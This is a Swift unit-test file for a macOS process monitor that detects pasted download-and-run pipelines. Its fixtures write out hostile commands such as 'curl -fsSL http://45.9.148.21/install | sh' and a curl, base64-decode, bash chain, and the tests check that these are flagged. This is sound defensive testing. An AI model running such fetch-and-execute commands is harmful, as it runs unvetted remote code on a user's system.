import XCTest
@testable import GhostProcessSniperCore

/// `curl … | sh` pasted into a terminal is two processes; Sentinel judges them as one command.
final class PipelineCorrelatorTests: XCTestCase {
    private let now = Date(timeIntervalSince1970: 1_900_000_000)
    private let terminal = "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"

    private func role(_ command: String) -> PipelineCorrelator.Role? {
        let words = command.split(separator: " ").map(String.init)
        return PipelineCorrelator.role(words: words, program: (words[0] as NSString).lastPathComponent)
    }

    func testRolesReadTheArguments() {
        XCTAssertEqual(role("curl -fsSL https://x"), .downloader)
        XCTAssertEqual(role("curl -o - https://x"), .downloader)
        XCTAssertNil(role("curl -fsSLo install.sh https://x"), "saved to a file")
        XCTAssertNil(role("curl -O https://x/file.tgz"))
        XCTAssertEqual(role("wget -qO- https://x"), .downloader)
        XCTAssertNil(role("wget https://x/file.tgz"), "wget saves to a file by default")
        XCTAssertEqual(role("base64 -d"), .filter)
        XCTAssertEqual(role("sh"), .stdinRunner)
        XCTAssertEqual(role("bash -s -- --yes"), .stdinRunner)
        XCTAssertNil(role("bash -c echo"))
        XCTAssertNil(role("sh install.sh"))
        XCTAssertEqual(role("python3"), .stdinRunner)
        XCTAssertNil(role("python3 -m json.tool"))
        XCTAssertEqual(role("sudo -E bash"), .stdinRunner)
        XCTAssertEqual(role("env FOO=1 sh"), .stdinRunner)
        XCTAssertNil(role("sudo softwareupdate -l"))
    }

    private func process(_ pid: Int32, _ name: String, _ path: String, command: String? = nil, parent: Int32 = 1,
                         group: Int32? = nil, startedMicroseconds: UInt64 = 0) -> ProcessMetrics {
        ProcessMetrics(identity: ProcessIdentity(pid: pid, startTimeSeconds: 1_899_999_990, startTimeMicroseconds: startedMicroseconds),
                       parentPID: parent, userID: 501, ownerName: "me", name: name, executablePath: path,
                       commandLine: command ?? path, residentMemoryBytes: 1, physicalFootprintBytes: 1,
                       virtualMemoryBytes: 1, cpuPercent: 0, totalProcessorSeconds: 0, threadCount: 1,
                       isSystemProcess: SentinelCatalog.isSystemLocation(path), sampledAt: now,
                       session: ProcessSessionInfo(processGroupID: group ?? pid, sessionID: 300, controllingTerminal: 7,
                                                   terminalForegroundGroupID: group, runState: .running))
    }

    private var tab: [ProcessMetrics] {
        [process(300, "Terminal", terminal), process(301, "login", "/usr/bin/login", command: "login -pf me", parent: 300),
         process(302, "-zsh", "/bin/zsh", command: "-zsh", parent: 301)]
    }

    /// The tab, then the pasted pipeline's members in `order`, one scan each.
    private func paste(_ members: [ProcessMetrics]) async -> SentinelReport {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: tab, uiVisible: true, now: now)
        var seen = tab
        var report = SentinelReport.empty
        for (index, member) in members.enumerated() {
            seen.append(member)
            report = await engine.ingest(processes: seen, uiVisible: true, now: now.addingTimeInterval(Double(index + 1)))
        }
        return report
    }

    private func curl(_ url: String, microseconds: UInt64 = 1_000) -> ProcessMetrics {
        process(500, "curl", "/usr/bin/curl", command: "curl -fsSL \(url)", parent: 302, group: 500,
                startedMicroseconds: microseconds)
    }

    private func runner(_ command: String, pid: Int32 = 501, microseconds: UInt64 = 3_000) -> ProcessMetrics {
        let name = String(command.split(separator: " ")[0])
        return process(pid, name, "/bin/\(name)", command: command, parent: 302, group: 500, startedMicroseconds: microseconds)
    }

    func testAPastedDownloadAndRunIsCaught() async throws {
        let report = await paste([curl("http://45.9.148.21/install"), runner("sh")])
        let finding = try XCTUnwrap(report.findings.first)
        XCTAssertEqual(finding.name, "sh")
        XCTAssertEqual(finding.severity, .suspicious)
        XCTAssertEqual(finding.headline, "A pasted command downloads and runs code")
        XCTAssertTrue(finding.recommendation.contains("paste"), finding.recommendation)
        XCTAssertTrue(finding.signals.contains { $0.detail.contains("curl -fsSL http://45.9.148.21/install | sh") })
    }

    func testEitherArrivalOrderIsPutTogether() async {
        let report = await paste([runner("sh", microseconds: 3_000), curl("http://45.9.148.21/install", microseconds: 1_000)])
        XCTAssertEqual(report.findings.first?.headline, "A pasted command downloads and runs code")
    }

    func testDecodingOnTheWayIsAStealersChain() async {
        let decode = process(502, "base64", "/usr/bin/base64", command: "base64 -d", parent: 302, group: 500,
                             startedMicroseconds: 2_000)
        let report = await paste([curl("https://cdn.example/p"), decode, runner("bash")])
        XCTAssertEqual(report.findings.first { $0.name == "bash" }?.severity, .dangerous)
    }

    func testOfficialInstallersAndUnrelatedCommandsStayQuiet() async {
        let installer = await paste([curl("https://sh.rustup.rs"), runner("sh")])
        XCTAssertTrue(installer.findings.isEmpty)
        let formatter = await paste([curl("https://api.example/data.json"), runner("python3 -m json.tool")])
        XCTAssertTrue(formatter.findings.isEmpty)
        let otherGroup = process(501, "sh", "/bin/sh", command: "sh", parent: 302, group: 777, startedMicroseconds: 3_000)
        let separate = await paste([curl("http://45.9.148.21/install"), otherGroup])
        XCTAssertTrue(separate.findings.isEmpty, "another job")
        let later = runner("sh", microseconds: 3_000)
        let laterStart = ProcessMetrics(
            identity: ProcessIdentity(pid: 501, startTimeSeconds: 1_899_999_996, startTimeMicroseconds: 0), parentPID: 302,
            userID: 501, ownerName: "me", name: "sh", executablePath: "/bin/sh", commandLine: "sh",
            residentMemoryBytes: 1, physicalFootprintBytes: 1, virtualMemoryBytes: 1, cpuPercent: 0, totalProcessorSeconds: 0,
            threadCount: 1, isSystemProcess: true, sampledAt: now, session: later.session)
        let apart = await paste([curl("http://45.9.148.21/install"), laterStart])
        XCTAssertTrue(apart.findings.isEmpty, "six seconds apart")
    }
}
